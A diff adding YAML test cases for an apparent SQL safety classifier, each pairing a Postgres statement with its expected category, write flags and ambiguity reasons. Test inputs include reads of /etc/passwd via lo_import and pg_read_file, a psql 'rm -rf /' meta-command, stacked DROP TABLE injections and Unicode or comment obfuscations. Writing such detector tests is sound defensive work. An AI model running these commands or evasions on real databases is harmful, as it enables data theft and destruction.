+    note: it would forge the deedglass logical message (S20)
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [pg_logical_emit_message]
+      dangerous_functions: [pg_logical_emit_message]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: S08
+    family: functions
+    sql: "SELECT query_to_xml('delete from orders returning 1', true, true, '')"
+    note: the inner statement is a string, so no table, write or RETURNING is seen
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      write_kinds: []
+      has_returning: false
+      tables: []
+      functions: [query_to_xml]
+      dangerous_functions: [query_to_xml]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: S09a
+    family: functions
+    sql: "SELECT pg_sleep(600)"
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [pg_sleep]
+      dangerous_functions: [pg_sleep]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: S09b
+    family: functions
+    sql: "SELECT set_config('search_path','evil',false)"
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [set_config]
+      dangerous_functions: [set_config]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: S10
+    family: functions
+    sql: "SELECT nextval('orders_id_seq')"
+    note: a write function makes a SELECT a write, with no row-level write kind
+    differential: true
+    expect:
+      kind: select
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: []
+      functions: [nextval]
+      dangerous_functions: []
+      write_functions: [nextval]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: S11
+    family: functions
+    sql: "SELECT app.cleanup_everything()"
+    note: setup defines a harmless app.cleanup_everything() so Postgres can run it
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: []
+      functions: [app.cleanup_everything]
+      dangerous_functions: []
+      write_functions: []
+      unknown_functions: [app.cleanup_everything]
+      ambiguous: false
+
+  - id: F01
+    family: functions
+    sql: "SELECT lo_import('/etc/passwd')"
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [lo_import]
+      dangerous_functions: [lo_import]
+      ambiguous: false
+
+  - id: F02
+    family: functions
+    sql: "SELECT pg_terminate_backend(1)"
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [pg_terminate_backend]
+      dangerous_functions: [pg_terminate_backend]
+      ambiguous: false
+
+  - id: F03
+    family: functions
+    sql: "SELECT pg_advisory_lock(1)"
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [pg_advisory_lock]
+      dangerous_functions: [pg_advisory_lock]
+      ambiguous: false
+
+  - id: F04
+    family: functions
+    sql: "SELECT pg_notify('c','x')"
+    differential: true
+    expect:
+      kind: select
+      category: write
+      statements: 1
+      writes: true
+      functions: [pg_notify]
+      dangerous_functions: []
+      write_functions: [pg_notify]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: F05
+    family: functions
+    sql: "SELECT count(*), lower(name), coalesce(name, 'none') FROM customers GROUP BY name"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      tables: [public.customers]
+      functions: [coalesce, count, lower]
+      dangerous_functions: []
+      write_functions: []
+      unknown_functions: []
+      ambiguous: false
+
+  - id: F06
+    family: functions
+    sql: "SELECT CAST(total AS numeric(10,2)), status::varchar(10), EXTRACT(year FROM now()) FROM orders"
+    note: cast, extract and type modifiers are not calls; FROM inside EXTRACT is not a table source
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: [public.orders]
+      tables_complete: true
+      functions: [now]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: F07
+    family: functions
+    sql: "SELECT pg_catalog.now(), gen_random_uuid()"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [gen_random_uuid, pg_catalog.now]
+      dangerous_functions: []
+      unknown_functions: []
+      ambiguous: false
+
+  - id: F08
+    family: functions
+    sql: "SELECT exists(SELECT 1), coalesce(NULL, 1), x.id FROM x WHERE x.id IN (1) AND x.id = ANY (ARRAY[1])"
+    note: exists, in, any and array are keywords, not calls
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: [public.x]
+      functions: [coalesce]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: F09
+    family: functions
+    sql: "SELECT 'pg_read_file(1)', $$pg_sleep(9)$$"
+    note: names inside strings and dollar quotes are not calls
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: []
+      dangerous_functions: []
+      unknown_functions: []
+      ambiguous: false
+
+  - id: F10
+    family: functions
+    sql: "SELECT PG_SLEEP(0)"
+    note: an upper-case dangerous name is still dangerous
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [pg_sleep]
+      dangerous_functions: [pg_sleep]
+      ambiguous: false
+
+  - id: F11
+    family: functions
+    sql: "SELECT setval('orders_id_seq', 100)"
+    differential: true
+    expect:
+      kind: select
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: []
+      functions: [setval]
+      write_functions: [setval]
+      ambiguous: false
+
+  - id: F12
+    family: functions
+    sql: "SELECT pg_catalog.pg_read_file('/etc/passwd')"
+    note: a schema-qualified dangerous function is matched by its unqualified name and listed as written
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [pg_catalog.pg_read_file]
+      dangerous_functions: [pg_catalog.pg_read_file]
+      unknown_functions: []
+      ambiguous: false
+
+  - id: F13
+    family: functions
+    sql: "SELECT my_helper(1)"
+    note: an unknown function; Postgres rejects it with 42883 because it doesn't exist
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: [my_helper]
+      dangerous_functions: []
+      unknown_functions: [my_helper]
+      ambiguous: false
+
+  # ---------------------------------------------------------------- multi
+  - id: M01
+    family: multi
+    sql: "SELECT 1; DROP TABLE orders"
+    differential: true
+    expect:
+      kind: select
+      category: ddl
+      kinds: [select, drop]
+      statements: 2
+      multi: true
+      writes: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: M02
+    family: multi
+    sql: "COMMIT; DROP TABLE orders;"
+    note: the C-004 pattern; it really commits, and the next case resets the schema
+    differential: true
+    expect:
+      kind: commit
+      category: ddl
+      kinds: [commit, drop]
+      statements: 2
+      multi: true
+      writes: true
+      ambiguous: false
+
+  - id: M03a
+    family: multi
+    sql: "SELECT 1 /* ; */ ; SELECT 2"
+    differential: true
+    expect:
+      kind: select
+      category: transaction
+      kinds: [select, select]
+      statements: 2
+      multi: true
+      ambiguous: false
+
+  - id: M03b
+    family: multi
+    sql: "SELECT ';' ; DELETE FROM orders"
+    differential: true
+    expect:
+      kind: select
+      category: write
+      kinds: [select, delete]
+      statements: 2
+      multi: true
+      writes: true
+      write_kinds: [delete]
+      has_where: false
+      unbounded_write: true
+      ambiguous: false
+
+  - id: M04a
+    family: multi
+    sql: "SELECT $x$ ; DROP TABLE t; $x$"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      writes: false
+      tables: []
+      ambiguous: false
+
+  - id: M04b
+    family: multi
+    sql: "SELECT 1 -- ; DROP TABLE t"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      writes: false
+      tables: []
+      ambiguous: false
+
+  - id: M05a
+    family: multi
+    sql: "SELECT 1 --\n; DROP TABLE t"
+    note: the line comment ends at the newline
+    differential: true
+    expect:
+      kind: select
+      category: ddl
+      kinds: [select, drop]
+      statements: 2
+      multi: true
+      tables: [public.t]
+      ambiguous: false
+
+  - id: M05b
+    family: multi
+    sql: "SELECT 1\r\n;DROP TABLE t"
+    differential: true
+    expect:
+      kind: select
+      category: ddl
+      kinds: [select, drop]
+      statements: 2
+      multi: true
+      tables: [public.t]
+      ambiguous: false
+
+  - id: M06
+    family: multi
+    sql: "BEGIN; DELETE FROM orders WHERE id=1; COMMIT"
+    note: write outranks transaction
+    differential: true
+    expect:
+      kind: begin
+      category: write
+      kinds: [begin, delete, commit]
+      statements: 3
+      multi: true
+      writes: true
+      write_kinds: [delete]
+      has_where: true
+      unbounded_write: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: M07
+    family: multi
+    sql: "SELECT 1; SELECT 2; SELECT 3"
+    differential: true
+    expect:
+      kind: select
+      category: transaction
+      kinds: [select, select, select]
+      statements: 3
+      multi: true
+      writes: false
+      ambiguous: false
+
+  - id: M08
+    family: multi
+    sql: "UPDATE orders SET status = 'x' WHERE id = 1; UPDATE orders SET status = 'y'"
+    note: one UPDATE without a WHERE is enough
+    differential: true
+    expect:
+      kind: update
+      category: write
+      kinds: [update, update]
+      statements: 2
+      multi: true
+      write_kinds: [update]
+      has_where: false
+      unbounded_write: true
+      where_trivial: false
+      ambiguous: false
+
+  - id: M09
+    family: multi
+    sql: "INSERT INTO support_notes (order_id, body) VALUES (2, 'y'); DELETE FROM order_tags WHERE order_id = 2"
+    differential: true
+    expect:
+      kind: insert
+      category: write
+      kinds: [insert, delete]
+      statements: 2
+      multi: true
+      write_kinds: [delete, insert]
+      has_where: true
+      unbounded_write: false
+      tables: [public.order_tags, public.support_notes]
+      ambiguous: false
+
+  - id: M10
+    family: multi
+    sql: "SELECT 1;;; SELECT 2;"
+    note: empty statements between semicolons don't count
+    differential: true
+    expect:
+      kind: select
+      category: transaction
+      kinds: [select, select]
+      statements: 2
+      multi: true
+      ambiguous: false
+
+  - id: M11
+    family: multi
+    sql: "SELECT 'a;b' AS \"c;d\"; SELECT 2"
+    differential: true
+    expect:
+      kind: select
+      category: transaction
+      kinds: [select, select]
+      statements: 2
+      multi: true
+      ambiguous: false
+
+  - id: M12
+    family: multi
+    sql: "SELECT (1); (SELECT 2)"
+    differential: true
+    expect:
+      kind: select
+      category: transaction
+      kinds: [select, select]
+      statements: 2
+      multi: true
+      ambiguous: false
+
+  - id: M13
+    family: multi
+    sql: "SELECT 1; SET search_path TO evil, public"
+    differential: true
+    expect:
+      kind: select
+      category: transaction
+      kinds: [select, set]
+      statements: 2
+      multi: true
+      writes: false
+      ambiguous: false
+
+  # ---------------------------------------------------------------- obfuscation
+  - id: O01a
+    family: obfuscation
+    sql: "/* hi */ DROP TABLE orders"
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      kinds: [drop]
+      statements: 1
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O01b
+    family: obfuscation
+    sql: "-- hi\nDROP TABLE orders"
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      kinds: [drop]
+      statements: 1
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O01c
+    family: obfuscation
+    sql: "DROP/**/TABLE/**/orders"
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      kinds: [drop]
+      statements: 1
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O02
+    family: obfuscation
+    sql: "/* a /* nested */ b */ DROP TABLE orders"
+    note: block comments nest
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      statements: 1
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O03
+    family: obfuscation
+    sql: "/* a /* nested */ DROP TABLE orders"
+    note: the outer comment never closes, so the DROP is inside it
+    differential: true
+    expect:
+      kind: empty
+      category: unknown
+      statements: 0
+      ambiguous: true
+      reasons: [unterminated_comment]
+
+  - id: O04
+    family: obfuscation
+    sql: "DrOp TaBlE orders"
+    differential: true
+    expect:
+      kind: drop
+      category: ddl
+      statements: 1
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O05
+    family: obfuscation
+    sql: "SELECT E'\\'' ; DROP TABLE t; --'"
+    note: E'\'' is one quote, so the DROP is a real second statement
+    differential: true
+    expect:
+      kind: select
+      category: ddl
+      kinds: [select, drop]
+      statements: 2
+      multi: true
+      tables: [public.t]
+      ambiguous: false
+
+  - id: O06
+    family: obfuscation
+    sql: "SELECT '\\'' ; DROP TABLE t; --'"
+    note: one string with standard_conforming_strings on, two statements with it off
+    differential: true
+    expect:
+      kind: select
+      category: unknown
+      kinds: [select]
+      statements: 1
+      writes: true
+      ambiguous: true
+      reasons: [backslash_in_string]
+
+  - id: O07a
+    family: obfuscation
+    sql: "\uFF24\uFF32\uFF2F\uFF30 TABLE orders"
+    note: fullwidth DROP; Postgres lexes it as an identifier and rejects the statement; the specific reason replaces unknown_statement
+    differential: true
+    expect:
+      kind: other
+      category: unknown
+      statements: 1
+      writes: true
+      ambiguous: true
+      reasons: [non_ascii_outside_literal]
+
+  - id: O07b
+    family: obfuscation
+    sql: "DR\u041EP TABLE orders"
+    note: Cyrillic capital O inside DROP
+    differential: true
+    expect:
+      kind: other
+      category: unknown
+      statements: 1
+      ambiguous: true
+      reasons: [non_ascii_outside_literal]
+
+  - id: O07c
+    family: obfuscation
+    sql: "DROP TABLE\u200B orders"
+    note: a zero-width space after TABLE
+    differential: true
+    expect:
+      kind: drop
+      category: unknown
+      statements: 1
+      ambiguous: true
+      reasons: [non_ascii_outside_literal]
+
+  - id: O07d
+    family: obfuscation
+    sql: "SELECT 1;\uFEFFDROP TABLE orders"
+    note: a byte order mark mid-text, glued to the second statement's keyword
+    differential: true
+    expect:
+      kind: select
+      category: unknown
+      kinds: [select, other]
+      statements: 2
+      multi: true
+      ambiguous: true
+      reasons: [non_ascii_outside_literal]
+
+  - id: O08a
+    family: obfuscation
+    sql: "SELECT 1\0; DROP TABLE orders"
+    note: a NUL byte; it can't be sent over the wire protocol, so it is not differential
+    differential: false
+    expect:
+      kind: select
+      category: unknown
+      statements: 2
+      ambiguous: true
+      reasons: [nul_byte]
+
+  - id: O08b
+    family: obfuscation
+    sql: "\\! rm -rf /"
+    note: a psql meta-command, not SQL; nothing for the server to compare
+    differential: false
+    expect:
+      kind: other
+      category: unknown
+      statements: 1
+      writes: true
+      ambiguous: true
+      reasons: [backslash_command]
+
+  - id: O08c
+    family: obfuscation
+    sql: "\\copy orders to program 'x'"
+    note: a psql meta-command that would run a client-side program
+    differential: false
+    expect:
+      kind: other
+      category: unknown
+      statements: 1
+      ambiguous: true
+      reasons: [backslash_command]
+
+  - id: O09a
+    family: obfuscation
+    sql: "EXPLAIN ANALYZE DELETE FROM orders"
+    note: EXPLAIN ANALYZE runs the statement
+    differential: true
+    expect:
+      kind: explain
+      category: write
+      kinds: [explain]
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      unbounded_write: true
+      explain_analyze: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O09b
+    family: obfuscation
+    sql: "EXPLAIN (ANALYZE, BUFFERS) UPDATE orders SET status = 'x' WHERE id = 1"
+    differential: true
+    expect:
+      kind: explain
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [update]
+      unbounded_write: false
+      explain_analyze: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O10
+    family: obfuscation
+    sql: "EXPLAIN SELECT * FROM orders"
+    differential: true
+    expect:
+      kind: explain
+      category: read
+      kinds: [explain]
+      statements: 1
+      writes: false
+      explain_analyze: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O11a
+    family: obfuscation
+    sql: "PREPARE p AS DELETE FROM orders; EXECUTE p"
+    note: Postgres tags EXECUTE with the prepared statement's tag (DELETE n); the runner accepts any tag for kind execute
+    differential: true
+    expect:
+      kind: prepare
+      category: unknown
+      kinds: [prepare, execute]
+      statements: 2
+      multi: true
+      writes: true
+      ambiguous: true
+      reasons: [execute_prepared]
+
+  - id: O11b
+    family: obfuscation
+    sql: "EXECUTE p"
+    note: p doesn't exist on a fresh session (26000)
+    differential: false
+    expect:
+      kind: execute
+      category: unknown
+      kinds: [execute]
+      statements: 1
+      writes: true
+      ambiguous: true
+      reasons: [execute_prepared]
+
+  - id: O15a
+    family: obfuscation
+    sql: "SELECT 'abc"
+    differential: true
+    expect:
+      kind: select
+      category: unknown
+      statements: 1
+      ambiguous: true
+      reasons: [unterminated_string]
+
+  - id: O15b
+    family: obfuscation
+    sql: "SELECT $a$ abc"
+    differential: true
+    expect:
+      kind: select
+      category: unknown
+      statements: 1
+      ambiguous: true
+      reasons: [unterminated_dollar_quote]
+
+  - id: O15c
+    family: obfuscation
+    sql: "SELECT \"abc"
+    note: an unterminated quoted identifier
+    differential: true
+    expect:
+      kind: select
+      category: unknown
+      statements: 1
+      ambiguous: true
+      reasons: [unterminated_identifier]
+
+  - id: O17
+    family: obfuscation
+    sql: "SELECT foo$bar, $1 FROM t"
+    note: foo$bar is an identifier and $1 a parameter, not a dollar quote; Postgres rejects the unbound $1 (42P02)
+    differential: false
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: [public.t]
+      functions: []
+      ambiguous: false
+
+  - id: O18
+    family: obfuscation
+    sql: "DELETE FROM public.\"orders; DROP TABLE x\" WHERE id = 1"
+    note: the semicolon is inside a quoted identifier; setup creates that table
+    differential: true
+    expect:
+      kind: delete
+      category: write
+      kinds: [delete]
+      statements: 1
+      multi: false
+      write_kinds: [delete]
+      has_where: true
+      unbounded_write: false
+      tables: ["public.orders; DROP TABLE x"]
+      ambiguous: false
+
+  - id: O19
+    family: obfuscation
+    sql: "SELECT U&'\\0044ROP'"
+    note: a Unicode-escape string; its backslash is the escape character, not backslash_in_string
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      ambiguous: false
+      reasons: []
+
+  - id: O20
+    family: obfuscation
+    sql: "SELECT E'it\\'s; DROP TABLE t' AS x"
+    note: an escaped quote in an E-string hides the semicolon
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      writes: false
+      tables: []
+      ambiguous: false
+
+  - id: O21
+    family: obfuscation
+    sql: "SELECT U&\"\\0044ROP\" FROM t"
+    note: a Unicode-escape identifier naming the column "DROP"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      tables: [public.t]
+      ambiguous: false
+
+  - id: O22
+    family: obfuscation
+    sql: "SELECT B'1010', X'1F', N'text'"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      functions: []
+      ambiguous: false
+
+  - id: O23
+    family: obfuscation
+    sql: "SELECT $a$ $b$ ; DROP TABLE t; $b$ $a$"
+    note: nested dollar tags; only $a$ closes the outer quote
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      tables: []
+      ambiguous: false
+
+  - id: O24
+    family: obfuscation
+    sql: "SELECT 1 AS \"a\"\"b; DROP TABLE t\""
+    note: a doubled quote inside a quoted identifier hides the semicolon
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      multi: false
+      tables: []
+      ambiguous: false
+
+  - id: O25
+    family: obfuscation
+    sql: "select $tag$ ' $tag$; drop table t"
+    note: a quote inside a dollar string doesn't open a string
+    differential: true
+    expect:
+      kind: select
+      category: ddl
+      kinds: [select, drop]
+      statements: 2
+      multi: true
+      tables: [public.t]
+      ambiguous: false
+
+  - id: O26
+    family: obfuscation
+    sql: "SELECT 'O''Brien; DROP TABLE t'"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      kinds: [select]
+      statements: 1
+      tables: []
+      ambiguous: false
+
+  - id: O27
+    family: obfuscation
+    sql: "/*DROP TABLE orders*/ SELECT 1"
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      writes: false
+      tables: []
+      ambiguous: false
+
+  - id: O28
+    family: obfuscation
+    sql: "SELECT E'\\\\'; DROP TABLE t"
+    note: an escaped backslash closes the E-string, so the DROP is real
+    differential: true
+    expect:
+      kind: select
+      category: ddl
+      kinds: [select, drop]
+      statements: 2
+      multi: true
+      ambiguous: false
+
+  - id: O29
+    family: obfuscation
+    sql: "EXPLAIN (ANALYZE true) DELETE FROM orders WHERE id = 1"
+    differential: true
+    expect:
+      kind: explain
+      category: write
+      statements: 1
+      writes: true
+      write_kinds: [delete]
+      unbounded_write: false
+      explain_analyze: true
+      ambiguous: false
+
+  - id: O30
+    family: obfuscation
+    sql: "EXPLAIN (FORMAT JSON) SELECT * FROM orders"
+    differential: true
+    expect:
+      kind: explain
+      category: read
+      statements: 1
+      writes: false
+      explain_analyze: false
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: O31
+    family: obfuscation
+    sql: "EXPLAIN DELETE FROM orders"
+    note: plain EXPLAIN plans the DELETE without running it
+    differential: true
+    expect:
+      kind: explain
+      category: read
+      statements: 1
+      writes: false
+      write_kinds: []
+      explain_analyze: false
+      ambiguous: false
+
+  - id: O32
+    family: obfuscation
+    sql: "EXPLAIN ANALYZE SELECT count(*) FROM orders"
+    differential: true
+    expect:
+      kind: explain
+      category: read
+      statements: 1
+      writes: false
+      write_kinds: []
+      explain_analyze: true
+      functions: [count]
+      ambiguous: false
+
+  - id: O33
+    family: obfuscation
+    sql: "SELECT e'\\''"
+    note: a lower-case E prefix
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      ambiguous: false
+      reasons: []
+
+  # ---------------------------------------------------------------- session
+  - id: O13
+    family: session
+    sql: "SET search_path TO evil, public"
+    differential: true
+    expect:
+      kind: set
+      category: session
+      kinds: [set]
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE01
+    family: session
+    sql: "SHOW search_path"
+    differential: true
+    expect:
+      kind: show
+      category: read
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE02
+    family: session
+    sql: "DISCARD ALL"
+    note: DISCARD ALL can't run inside a transaction block (25001)
+    differential: false
+    expect:
+      kind: discard
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE03
+    family: session
+    sql: "SET statement_timeout = '5s'"
+    differential: true
+    expect:
+      kind: set
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE04
+    family: session
+    sql: "RESET search_path"
+    differential: true
+    expect:
+      kind: reset
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE05
+    family: session
+    sql: "LISTEN orders_changed"
+    differential: true
+    expect:
+      kind: listen
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE06
+    family: session
+    sql: "NOTIFY orders_changed, 'x'"
+    differential: true
+    expect:
+      kind: notify
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE07
+    family: session
+    sql: "DECLARE c CURSOR FOR SELECT * FROM orders; FETCH 1 FROM c; MOVE NEXT IN c; CLOSE c"
+    differential: true
+    expect:
+      kind: declare
+      category: transaction
+      kinds: [declare, fetch, move, close]
+      statements: 4
+      multi: true
+      writes: false
+      ambiguous: false
+
+  - id: SE08
+    family: session
+    sql: "PREPARE q AS SELECT 1"
+    differential: true
+    expect:
+      kind: prepare
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE09
+    family: session
+    sql: "DEALLOCATE ALL"
+    differential: true
+    expect:
+      kind: deallocate
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: SE10
+    family: session
+    sql: "UNLISTEN *"
+    differential: true
+    expect:
+      kind: unlisten
+      category: session
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  # ---------------------------------------------------------------- transaction
+  - id: TX01
+    family: transaction
+    sql: "BEGIN"
+    differential: true
+    expect:
+      kind: begin
+      category: transaction
+      kinds: [begin]
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX02
+    family: transaction
+    sql: "START TRANSACTION"
+    differential: true
+    expect:
+      kind: start
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX03
+    family: transaction
+    sql: "COMMIT"
+    differential: true
+    expect:
+      kind: commit
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX04
+    family: transaction
+    sql: "END"
+    note: a keyword-only statement; Postgres tags it COMMIT
+    differential: true
+    expect:
+      kind: end
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX05
+    family: transaction
+    sql: "ROLLBACK"
+    differential: true
+    expect:
+      kind: rollback
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX06
+    family: transaction
+    sql: "ABORT"
+    note: Postgres tags it ROLLBACK
+    differential: true
+    expect:
+      kind: abort
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX07
+    family: transaction
+    sql: "SAVEPOINT s1"
+    differential: true
+    expect:
+      kind: savepoint
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX08
+    family: transaction
+    sql: "BEGIN; SAVEPOINT a; RELEASE SAVEPOINT a; COMMIT"
+    differential: true
+    expect:
+      kind: begin
+      category: transaction
+      kinds: [begin, savepoint, release, commit]
+      statements: 4
+      multi: true
+      writes: false
+      ambiguous: false
+
+  - id: TX09
+    family: transaction
+    sql: "PREPARE TRANSACTION 'x'"
+    note: needs max_prepared_transactions > 0, which a default cluster doesn't have
+    differential: false
+    expect:
+      kind: prepare
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX10
+    family: transaction
+    sql: "COMMIT PREPARED 'x'"
+    note: can't run inside a transaction block (25001)
+    differential: false
+    expect:
+      kind: commit
+      category: transaction
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: TX11
+    family: transaction
+    sql: "SAVEPOINT s1; ROLLBACK TO SAVEPOINT s1"
+    differential: true
+    expect:
+      kind: savepoint
+      category: transaction
+      kinds: [savepoint, rollback]
+      statements: 2
+      multi: true
+      writes: false
+      ambiguous: false
+
+  # ---------------------------------------------------------------- maintenance
+  - id: O14
+    family: maintenance
+    sql: "LOCK TABLE orders IN ACCESS EXCLUSIVE MODE"
+    differential: true
+    expect:
+      kind: lock
+      category: maintenance
+      statements: 1
+      writes: false
+      locks_rows: true
+      tables: [public.orders]
+      ambiguous: false
+
+  - id: MA01
+    family: maintenance
+    sql: "VACUUM orders"
+    note: VACUUM can't run inside a transaction block (25001)
+    differential: false
+    expect:
+      kind: vacuum
+      category: maintenance
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: MA02
+    family: maintenance
+    sql: "ANALYZE orders"
+    differential: true
+    expect:
+      kind: analyze
+      category: maintenance
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: MA03
+    family: maintenance
+    sql: "REFRESH MATERIALIZED VIEW customer_names"
+    differential: true
+    expect:
+      kind: refresh
+      category: maintenance
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: MA04
+    family: maintenance
+    sql: "REINDEX TABLE orders"
+    differential: true
+    expect:
+      kind: reindex
+      category: maintenance
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: MA05
+    family: maintenance
+    sql: "CLUSTER orders USING orders_pkey"
+    differential: true
+    expect:
+      kind: cluster
+      category: maintenance
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  - id: MA06
+    family: maintenance
+    sql: "CHECKPOINT"
+    note: cluster-wide; not worth running in the differential test
+    differential: false
+    expect:
+      kind: checkpoint
+      category: maintenance
+      statements: 1
+      writes: false
+      ambiguous: false
+
+  # ---------------------------------------------------------------- limits
+  - id: O16a
+    family: limits
+    gen: too_large
+    note: 262,145 bytes of "SELECT 1 -- xxx..."; refused before it is read, so no statement is counted
+    differential: false
+    expect:
+      kind: other
+      category: unknown
+      statements: 0
+      writes: true
+      ambiguous: true
+      reasons: [too_large]
+      bytes: 262145
+
+  - id: O16b
+    family: limits
+    gen: too_deep
+    note: 300 nested parentheses around 1
+    differential: false
+    expect:
+      kind: select
+      category: unknown
+      statements: 1
+      ambiguous: true
+      reasons: [too_deep]
+
+  - id: L01
+    family: limits
+    gen: too_many_statements
+    note: 1,001 copies of "SELECT 1;"; the count stops at MaxStatements
+    differential: false
+    expect:
+      kind: select
+      category: unknown
+      statements: 1000
+      multi: true
+      ambiguous: true
+      reasons: [too_many_statements]
+
+  - id: L02
+    family: limits
+    sql: "SELECT ((((((((((((((((((((1))))))))))))))))))))"
+    note: 20 levels deep, well under MaxDepth
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      ambiguous: false
+      reasons: []
+
+  - id: L03
+    family: limits
+    sql: "SELECT '\u00E9'"
+    note: bytes counts UTF-8 bytes, not characters; non-ASCII inside a string is fine
+    differential: true
+    expect:
+      kind: select
+      category: read
+      statements: 1
+      ambiguous: false
+      reasons: []
+      bytes: 11
